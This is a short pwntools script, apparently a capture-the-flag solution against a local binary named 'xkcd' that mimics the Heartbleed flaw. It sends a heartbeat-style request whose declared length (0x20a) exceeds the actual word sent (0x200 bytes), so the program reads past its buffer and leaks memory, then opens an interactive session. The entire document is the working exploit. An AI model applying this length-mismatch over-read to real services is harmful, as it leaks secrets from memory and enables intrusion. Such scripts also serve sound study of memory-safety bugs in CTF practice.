from pwn import *

target = process('./xkcd')


def send_message(word, word_len):
    target.sendline(f'SERVER, ARE YOU STILL THERE? IF SO, REPLY "{word}" ({word_len} LETTERS).')

send_message('B'*0x200, 0x20a)

target.interactive()